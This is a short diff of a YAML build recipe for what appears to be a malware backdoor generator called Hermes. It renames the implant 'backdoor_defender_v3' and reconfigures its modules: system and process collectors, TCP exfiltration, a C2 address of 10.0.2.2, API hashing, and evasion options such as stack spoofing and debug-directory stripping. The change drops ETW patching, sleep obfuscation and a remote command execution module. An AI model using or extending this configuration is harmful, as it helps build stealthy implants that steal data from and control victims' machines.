@@ -1,4 +1,4 @@
-name: backdoor_cs_winhttp_v1
+name: backdoor_defender_v3
 description: Auto-generated recipe by Hermes (c)
 core:
 - core/emit_buffer
@@ -7,17 +7,12 @@ core:
 collectors:
 - collectors/system_info
 - collectors/processes
-exfil: c2/winhttp_beacon
-arch: arch/backdoor_staged
-commands:
-- commands/cmd_sysinfo
-- commands/cmd_processes
-- commands/cmd_exec
+exfil: exfil/tcp_flush
+arch: arch/sequential
 resources: true
-api_resolve: api_resolve/api_hash_ror13
+api_resolve: api_resolve/api_hash_djb2
 evasion:
-- evasion/etw_patch
-- evasion/sleep_ekko
+- evasion/stack_spoof
 - evasion/debug_dir_strip
 vars:
   C2_IP: 10.0.2.2
